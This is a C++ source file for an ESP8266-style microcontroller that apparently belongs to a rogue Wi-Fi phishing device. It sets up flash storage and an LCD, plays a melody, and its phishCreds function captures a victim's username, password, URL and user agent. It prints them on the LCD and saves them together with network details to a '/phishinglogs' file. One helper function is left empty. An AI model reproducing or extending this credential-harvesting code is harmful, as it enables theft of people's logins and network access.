#include <FS.h>
#include <Wire.h>
#include <LiquidCrystal_I2C.h>

extern LiquidCrystal_I2C lcd;


void play(char note,int beats)
{
  int numnotes = 14;

  char notes[] = {'c', 'd', 'e', 'f', 'g', 'a', 'b', 'C', 'D', 'E', 'F', 'G', 'A', 'B', ' '};

  int frekuensi[] = {131, 147, 165, 175, 196, 220, 247, 262, 294, 330, 349, 392, 440, 494, 0};

  int currentfrekuensi = 0;
  int beatlength = 300;

  for(int i = 0; i<numnotes; i++)
  {
    if (notes[i] == note)
    {
      currentfrekuensi = frekuensi[i];
    }
  }

  tone(15,currentfrekuensi,beats*beatlength);
  tone(13,currentfrekuensi,beats*beatlength);
  delay(beats*beatlength);
  delay(50);
}


void startSPIFFS(){
  SPIFFS.begin();
  lcd.clear();
  lcd.setCursor(0, 0); //SETA A POSIÇÃO EM QUE O CURSOR INCIALIZA(LINHA 1)
  lcd.print("SPIFFS  INICIADA"); //ESCREVE O TEXTO NA PRIMEIRA LINHA DO DISPLAY LCD

  File f1 = SPIFFS.open("/log", "a");
  f1.close();

  File f2 = SPIFFS.open("/phishinglogs", "a");
  f2.println("[]");
  f2.close();

  play('g',2);//SO
  play('C',4);//YUZ
  play('g',3);//NE
  play('a',1);//RU
  play('b',4);//SHI
  
}



void logging(char *logString){
  File logFile = SPIFFS.open("/log", "a");
  if (!logFile){
    Serial.println("Could not creat log file");
  }
  Serial.print(logString);
  if(logFile.println(logString)){
    Serial.println("  -->> Log was written");;
  } else {
      Serial.println("  -->> Log write failed");
  }

  logFile.close();
}

JsonArray& parseOrCreate(DynamicJsonBuffer& jb, const String& json) {

}

void phishCreds(String url, String user, String pass, String userAgent){
  lcd.clear();
  lcd.setCursor(0, 0); //SETA A POSIÇÃO EM QUE O CURSOR INCIALIZA(LINHA 1)
  lcd.print(user); 
  lcd.setCursor(0, 1);
  lcd.print(pass); 

  stationPhished = 1;

  logging("phishCreds :: CLIENT PHISHED");

  logging("loadSettingJSON :: Opening config json file ");
  // Serial.print(W_ESPJSON);
  File configFile = SPIFFS.open("/phishinglogs", "r");

  size_t size = configFile.size();
  std::unique_ptr<char[]> buf(new char[size]);
  configFile.readBytes(buf.get(), size);
  // StaticJsonBuffer<500> jsonBuffer;
  DynamicJsonBuffer jsonBuffer(size);


  JsonArray& array = jsonBuffer.parseArray(buf.get());
  // if (array.success() == false) {
  //   JsonArray& array = jsonBuffer.createArray();
  // }

  // JsonArray& array = jsonBuffer.createArray();
  // JsonObject& json = jsonBuffer.parseObject(buf.get());
  // Serial.println(size);
  // if (size != 0){
  //   JsonArray& array = jsonBuffer.parseArray(buf.get());
  //   array.prettyPrintTo(Serial);
  // }

  array.prettyPrintTo(Serial);
  configFile.close();





  JsonObject& obj = array.createNestedObject();
  obj["url"] = url;
  obj["ssid"] = ssid;
  obj["hidden"] = hidden;
  obj["channel"] = channel;
  obj["user"] = user;
  obj["pass"] = pass;
  obj["userAgent"] = userAgent;
  // array.add(obj);
  File configFileA = SPIFFS.open("/phishinglogs", "w");
  array.printTo(configFileA);
  array.prettyPrintTo(Serial);
  configFileA.close();


  play('g',2);//SO
  play('C',4);//YUZ
  play('g',3);//NE
  play('a',1);//RU
  play('b',4);//SHI
  play('e',2);//MYY
  play('e',2);//RES
  play('a',4);//PU
  play('g',3);//BLIK
  play('f',1);//SVO
  play('g',4);//BOD
  play('c',3);//NIK

}

void wipeLog(const char *file, const char *empty){

  SPIFFS.remove(file);
  File f = SPIFFS.open(file, "a");
  f.println("[]");
  f.close();
}
